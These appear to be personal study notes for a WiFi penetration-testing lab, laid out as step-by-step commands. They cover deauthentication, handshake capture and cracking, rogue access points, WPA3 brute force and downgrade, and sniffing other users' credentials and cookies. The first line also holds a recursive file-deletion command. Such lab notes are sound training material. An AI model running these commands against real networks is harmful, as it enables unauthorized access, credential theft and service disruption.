# Main
- delete unused files: ``` find . -type f ! -name "*.conf" -exec rm {} \;```

## Basic Recon
- Clean processes first: ``` sudo airmon-ng check kill ```
### 
- monitor channel has another name 
- 'Station' = mac address of that AP | CH = channel
- ```--band abg```: This specifies that the tool should capture packets on both 2.4 GHz (b) and 5 GHz (a) bands
- ```--manufacturer```: This flag enables logging of manufacturer information for detected devices based on their MAC addresses.
- ```--wps```: This option includes WPS (Wi-Fi Protected Setup) information in the output, which can provide details about supported WPS versions and configuration methods.
1. Check AP/ESSID/Channel/etc..
    ```
    sudo airmon-ng start wlan0
    sudo airodump-ng wlan0mon -w ./scan --manufacturer --wps --band abg 
    -c {channel number for smaller scope}

    ```
2. Crack hidden AP name
    ```
    // prep wordlist | customize it 
    cat ~/rockyou-top100000.txt | awk '{print "wifi-" $1}' > ./wifi-rockyou.txt 
    
    // ready crack | Remember turn off airodump first !!! | try few more times
    iwconfig wlan0mon channel 11
    mdk4 wlan0mon p -t {BSSID} -f ./wifi-rockyou.txt
    ```
   
## OPN 
### Direct login with admin/admin
1. create {name}.conf file
   ```
        network={
        ssid="$ESSID"
        key_mgmt=NONE
        scan_ssid=1 
        }
   ```
2. connect with other wifi interface (not wlan2)```sudo wpa_supplicant -D nl80211 -i wlan2 -c free.conf ```
3. ``` sudo dhclient wlan2 ```
4. (optional) disconnect the connection
   ```
    ps -aux | grep wpa_supplicant

    sudo kill {pid}  // 2nd column
   ```
5. check ap ip ``` arp -a ```

### Sniff user/pwd
1. dump ``` sudo airodump-ng {wifi interface that connected to that AP} -w dump.cap --manufacturer --wps --band abg ``` [e.g. using wlan2 then dump with wlan2]
2. sniff http ``` wireshark dump.cap ```
3. search http if found portal pw


## WEP
1. https://github.com/alenperic/OSWP-Study-Guide?tab=readme-ov-file#wep-wired-equivalent-privacy 
- Target client not the host when runnning besside-ng
2. prepare wep.conf
    ```
    network={
        ssid="$ESSID"
        key_mgmt=NONE
        wep_key0=11BB33CD55
        wep_tx_keyidx=0
    }

    ```
3. ``` sudo wpa_supplicant -D nl80211 -i wlan2 -c wep.conf ```
4. ``` sudo dhclient wlan2 -v ```


## WPA2 PSK
### Get AP password
1. ``` airodump-ng wlan0mon -w ./ -c 6 --wps ```
   in parrell run: 
   ``` aireplay-ng -0 10 -a $BSSID wlan0mon ```
2. Crack ``` aircrack-ng ./scan-01.cap -w ~/rockyou-top100000.txt ```
3. Get password by selecting index

### Locate ip of the AP web server (not necessarry)
1.  ``` airdecap-ng -e wifi-mobile -p starwars1 ./scan-01.cap ```
2.  Double click the xxx-dec.cap

### Login portal
1. psk.conf 
    ```
        network={
        ssid="wifi-mobile"
        psk="$PASSWORD"
        scan_ssid=1
        key_mgmt=WPA-PSK
        proto=WPA2
    }
2. stealing cookie/credentials from ```xxx-dec.cap (filter http post if have login history)``` from other user to login portal
3. ``` sudo wpa_supplicant -Dnl80211 -iwlan3 -c psk.conf ```
4. ``` sudo dhclient wlan3 -v ```

### locate other clients and web server
1. ``` sudo arp-scan -I wlan3 -l ```


## WPA2 PSK (not visible)
1. prepare hostapd.conf
    ```
    interface=wlan1
    driver=nl80211
    hw_mode=g
    channel=1
    ssid=wifi-offices
    mana_wpaout=hostapd.hccapx
    wpa=2
    wpa_key_mgmt=WPA-PSK
    wpa_pairwise=TKIP CCMP
    wpa_passphrase=12345678
    ```
2. ```hostapd-mana hostapd.conf```
3. CTRL+C when AP-STA-POSSIBLE-PSK-MISMATCH.
4. extract ``` $WPA* xxxx ``` to ```password.txt```
5. Crack the wifi password ``` sudo hashcat -a 0 -m 22000 password.txt ~/rockyou-top100000.txt --force ```

## WPA 3 SAE

### Brute force
- https://github.com/blunderbuss-wctf/wacker
1. ```cd ~/tools```
2. ```git clone https://github.com/blunderbuss-wctf/wacker```
3. ``` ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462 ``` [ [frequency go search wifi channel x freq , ch10 = 2457](https://en.wikipedia.org/wiki/List_of_WLAN_channels)
4. prep wpa3sae.conf
   ```
    network={
        ssid="wifi-management"
        psk=""
        key_mgmt=SAE
        scan_ssid=1
        ieee80211w=2
    }

   ```
5. ``` sudo wpa_supplicant -Dnl80211 -iwlan3 -c  wpa3sae.conf```
6. ``` sudo dhclient wlan3 -v  ```

### Downgrade attack
- can reuse method of fake beacon attack in wpa2 psk (not visible)
1. check csv file "-01.csv" from airodump if "privacy" = “SAE PSK"
2. check wireshark wlan0mon where ssid = xxx then see if this 2 value == false
   ![alt text](image.png)
3. prepare hostapd-sae.conf
   ```
    interface=wlan1
    driver=nl80211
    hw_mode=g
    channel=11
    ssid=wifi-IT
    mana_wpaout=hostapd-management.hccapx
    wpa=2
    wpa_key_mgmt=WPA-PSK
    wpa_pairwise=TKIP CCMP
    wpa_passphrase=12345678
   ```
4. ``` hostapd-mana hostapd-sae.conf ``` and wait handshake
5. turn off wlan0mon airodump first 
6. set same channel to the ap ```iwconfig wlan0mon channel 11```
7. trigger deauth ``` aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52 ```
8. extract ``` $WPA* xxxx ``` to ```password.txt```
9. Crack the wifi password ``` sudo hashcat -a 0 -m 22000 password.txt ~/rockyou-top100000.txt --force ```
10. prep wpa3saepsk.conf
   ```
    network={
        ssid="wifi-management"
        psk=""
        key_mgmt=SAE
        scan_ssid=1
    }

   ```
11. ``` sudo wpa_supplicant -Dnl80211 -iwlan3 -c  wpa3saepsk.conf```
12. ``` sudo dhclient wlan3 -v ```

## WPA 2 MGT (Recon stage)
### Check domain name of this AP
- https://github.com/r4ulcl/wifi_db
1. Choose channel to listen and dump pcap ``` airodump-ng wlan0mon -w ./scanc44 -c 44 --wps ```
2. Go to the tool path ``` cd /root/tools/wifi_db ```
3. choose the kasmite file name for last param ``` python3 wifi_db.py -d wifichallenge.SQLITE /home/user/newwifi/scanc44-01 ```
4. Browse ``` sqlitebrowser wifichallenge.SQLITE ``` and go "browse data" tab, change table to IdentityAP

### Get email address of server cert
- https://gist.github.com/r4ulcl/f3470f097d1cd21dbc5a238883e79fb2
1. ``` cd /root/tools/ ```
2. ``` bash pcapFilter.sh -f /home/user/newwifi/scanc44-01.cap -C ```
3. Find Certificate: Subject --> last value

### Check EAP method 
- https://github.com/blackarrowsec/EAP_buster
1. ``` cd /root/tools/EAP_buster/ ```
2. using tool wifi_db to check users in this network (Table: IdentityAP)
   
   【OR] use the name found in there then ``` bash ./EAP_buster.sh $SSID 'GLOBAL\GlobalAdmin' wlan1 ``` 